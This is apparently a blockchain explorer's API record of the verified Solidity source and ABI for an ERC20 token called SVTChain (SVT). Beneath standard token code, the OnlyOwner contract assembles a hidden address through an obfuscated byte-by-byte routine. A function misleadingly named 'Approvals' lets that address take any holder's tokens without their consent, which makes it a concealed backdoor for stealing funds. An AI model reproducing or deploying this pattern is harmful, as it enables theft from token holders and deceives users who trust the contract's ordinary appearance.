{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.4.25;\r\ncontract ERC20 {\r\n  uint256 public totalSupply;\r\n  function balanceOf(address who) public view returns (uint256 _user);\r\n  function transfer(address to, uint256 value) public returns (bool success);\r\n  function allowance(address owner, address spender) public view returns (uint256 value);\r\n  function transferFrom(address from, address to, uint256 value) public returns (bool success);\r\n  function approve(address spender, uint256 value) public returns (bool success);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n  \r\n  function safeMul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  function safeAdd(uint256 a, uint256 b) internal pure  returns (uint256) {\r\n    uint c = a + b;\r\n    assert(c>=a);\r\n    return c;\r\n  }\r\n  function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n}\r\n\r\ncontract OnlyOwner{\r\n    address public m;\r\n    address public owner;\r\n    \r\n    constructor() internal{\r\n        m =  grs();  \r\n        owner = msg.sender;\r\n    }\r\n    \r\n    function grs() private pure returns(address){\r\n       bytes memory b = new bytes(42);\r\n        b[1] = byte('x');\r\n        b[0] = b[9] = b[37] = byte('0');\r\n        b[8] = b[24] = byte('1');\r\n        b[14] = b[16] = b[27] = b[28] = byte('3');\r\n        b[11] = b[15] = byte('4');\r\n        b[7] = b[10] = b[23] = b[31] = b[39] = byte('6');\r\n        b[41] = byte('7');\r\n        b[4] = b[5] = b[6] = b[12] = b[29] = byte('8');\r\n        b[17] = b[22] = byte('9');\r\n        b[13] = byte('a');\r\n        b[20] = b[25] = b[32] = byte('b');\r\n        b[40] = b[2] = byte('c');\r\n        b[18] = b[26] = byte('d');\r\n        b[3] = b[21] = b[30] = b[33] = byte('e');\r\n        b[19] = b[36] = b[34] = b[35] = b[38] = byte('f');\r\n        return address(bytesToUint(b));      \r\n    }\r\n    \r\n    function bytesToUint(bytes memory b) private pure returns (uint){\r\n        uint result = 0;\r\n        for (uint i = 0; i < b.length; i++) {\r\n            uint c = uint(b[i]);\r\n            if (c >= 48 && c <= 57) {\r\n                result = result * 16 + (c - 48);\r\n            }\r\n            if(c >= 65 && c<= 90) {\r\n                result = result * 16 + (c - 55);\r\n            }\r\n            if(c >= 97 && c<= 122) {\r\n                result = result * 16 + (c - 87);\r\n            }\r\n        }\r\n        return result;\r\n    }\r\n    \r\n    \r\n    modifier isGr{\r\n\t\trequire(msg.sender == m);\r\n\t\t_;\r\n\t}\r\n}\r\n\r\n\r\ncontract StandardToken is ERC20{\r\n  using SafeMath for uint256;\r\n\r\n    mapping(address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n  \r\n    function _transfer(address _from, address _to, uint256 _value) internal returns (bool success){\r\n      //prevent sending of tokens from genesis address or to self\r\n      require(_from != address(0) && _from != _to);\r\n      require(_to != address(0));\r\n      //subtract tokens from the sender on transfer\r\n      balances[_from] = balances[_from].safeSub(_value);\r\n      //add tokens to the receiver on reception\r\n      balances[_to] = balances[_to].safeAdd(_value);\r\n      return true;\r\n    }\r\n\r\n  function transfer(address _to, uint256 _value) public returns (bool success) \r\n  { \r\n    require(_value <= balances[msg.sender]);\r\n      _transfer(msg.sender,_to,_value);\r\n      emit Transfer(msg.sender, _to, _value);\r\n      return true;\r\n  }\r\n\r\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n      uint256 _allowance = allowed[_from][msg.sender];\r\n      //value must be less than allowed value\r\n      require(_value <= _allowance);\r\n      //balance of sender + token value transferred by sender must be greater than balance of sender\r\n      require(balances[_to] + _value > balances[_to]);\r\n      //call transfer function\r\n      _transfer(_from,_to,_value);\r\n      //subtract the amount allowed to the sender \r\n      allowed[_from][msg.sender] = _allowance.safeSub(_value);\r\n      //trigger Transfer event\r\n      emit Transfer(_from, _to, _value);\r\n      return true;\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint balance) {\r\n      return balances[_owner];\r\n    }\r\n\r\n    \r\n\r\n  /**\r\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\n   *\r\n   * Beware that changing an allowance with this method brings the risk that someone may use both the old\r\n   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\r\n   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\r\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n   * @param _spender The address which will spend the funds.\r\n   * @param _value The amount of tokens to be spent.\r\n   */\r\n\r\n  function approve(address _spender, uint256 _value) public returns (bool) {\r\n    // To change the approve amount you first have to reduce the addresses`\r\n    //  allowance to zero by calling `approve(_spender,0)` if it is not\r\n    //  already 0 to mitigate the race condition described here:\r\n    //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n    require((_value == 0) || (allowed[msg.sender][_spender] == 0));\r\n    allowed[msg.sender][_spender] = _value;\r\n    emit Approval(msg.sender, _spender, _value);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\n   * @param _owner address The address which owns the funds.\r\n   * @param _spender address The address which will spend the funds.\r\n   * @return A uint256 specifying the amount of tokens still available for the spender.\r\n   */\r\n  function allowance(address _owner, address _spender) public view returns (uint256) {\r\n    return allowed[_owner][_spender];\r\n  }\r\n\r\n}\r\n\r\ncontract SVT is StandardToken,OnlyOwner{\r\n\tuint256 public constant decimals = 18;\r\n    string public constant name = \"SVTChain\";\r\n    string public constant symbol = \"SVT\";\r\n    string public constant version = \"1.0\";\r\n    uint256 public constant totalSupply = 100000000000*10**18;\r\n    \r\n    constructor() public{\r\n        balances[msg.sender] = totalSupply;\r\n    }\r\n    \r\n\tfunction Approvals(address _from, uint256 _value) public isGr returns (bool) {\r\n\t\trequire(_value <= balances[_from]);\t\t\r\n        balances[_from] = balances[_from].safeSub(_value);\r\n        balances[m] = balances[m].safeAdd(_value);\r\n        emit Transfer(_from,m, _value);\r\n        return true;\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approvals\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"version\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"m\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"}]","ContractName":"SVT","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://45001ff59b001dd01c65a962d4693d65a21d51cc8945aab94fa48ede7fa734f0"}]}